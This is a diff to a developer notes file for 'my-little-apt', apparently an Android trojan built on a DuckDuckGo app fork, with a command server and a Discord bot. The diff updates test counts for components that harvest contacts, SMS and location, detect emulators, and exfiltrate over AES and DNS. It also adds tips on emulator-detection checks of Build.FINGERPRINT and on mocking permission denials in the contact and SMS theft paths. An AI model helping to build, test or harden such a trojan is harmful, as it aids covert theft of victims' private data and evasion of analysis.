@@ -68,10 +68,11 @@ my-little-apt/
 │               ├── BeaconWorkerTest.kt       # 11 tests (Robolectric)
 │               ├── BeaconBootReceiverTest.kt # 3 tests (Robolectric + WorkManagerTestInitHelper)
 │               ├── CommandHandlerTest.kt     # 14 tests (Robolectric) — contacts/SMS/location paths
-│               ├── RealBeaconServiceTest.kt  # 16 tests (mockito) — emulator detection, fingerprint injection
+│               ├── RealBeaconServiceTest.kt  # 16 tests (Mockito) — emulator detection, fingerprint injection
 │               ├── DeviceFingerprintTest.kt  # 4 tests (Robolectric) — root/carrier/app-count logic
 │               ├── AesExfiltratorTest.kt     # 5 tests — encryption correctness
 │               └── DnsExfiltratorTest.kt     # 5 tests — chunking and QNAME format
+│               # Total: 56 tests
 │
 ├── .github/workflows/        # CI/CD pipelines (trigger on main, feat/**, fix/**)
 ├── README.md                 # User-facing deployment guide
@@ -294,7 +295,7 @@ cd server && python -m pytest tests/ -v
 # Discord Bot (121 tests)
 cd discord-bot && python -m pytest tests/ -v
 
-# Android Client (36 tests)
+# Android Client (56 tests)
 # With system Java 17:
 cd trojan-ddg && ./gradlew :trojan-impl:testDebugUnitTest
 # Without system Java 17 (point to Android Studio's bundled JDK):
@@ -377,3 +378,5 @@ Each component has its own GitHub Actions workflow triggered by `paths` filters:
 10. **Protocol is exfiltration-only:** `communication_protocol` controls only `sendResult()`. Check-in and task polling always use HTTP regardless of the configured protocol.
 11. **Trojan CI — no submodules:** `trojan-ci.yml` uses `submodules: false`. The DDG upstream has a native C++ submodule (`bloom_cpp`) with no URL in `.gitmodules`. Recursive submodule checkout fails; since `:trojan-impl:testDebugUnitTest` is JVM-only, submodules are not needed.
 12. **AES library — use `cryptography`, not `pyCryptodome`:** `server/crypto.py` uses `pyca/cryptography` (package `cryptography`). Bandit B413 flags the `pyCryptodome` import path (`from Crypto.Cipher import AES`) even though pyCryptodome is maintained. Use `cryptography` to keep CI clean.
+13. **Robolectric 4.16+ — `Build.*` fields are null:** In Robolectric 4.16.1+, `android.os.Build` constants (`FINGERPRINT`, `MODEL`, `MANUFACTURER`, etc.) return `null` instead of empty strings. Any code that calls `.startsWith()` or `.contains()` on them directly will throw NPE. Always use `.orEmpty()` before calling string methods: `Build.FINGERPRINT.orEmpty().startsWith("generic")`.
+14. **Testing ContentProvider permission denial with Robolectric:** Do NOT use `android.test.mock.MockContentResolver` in Robolectric unit tests — the class is not on the compile classpath and its `query()` method is `final` (inherited from `ContentResolver`). Instead, register a throwing `ContentProvider` via `ShadowContentResolver.registerProviderInternal(authority, provider)` where the provider's `query()` throws `SecurityException`. The authority for contacts is `ContactsContract.AUTHORITY`; for SMS it is `"sms"`.
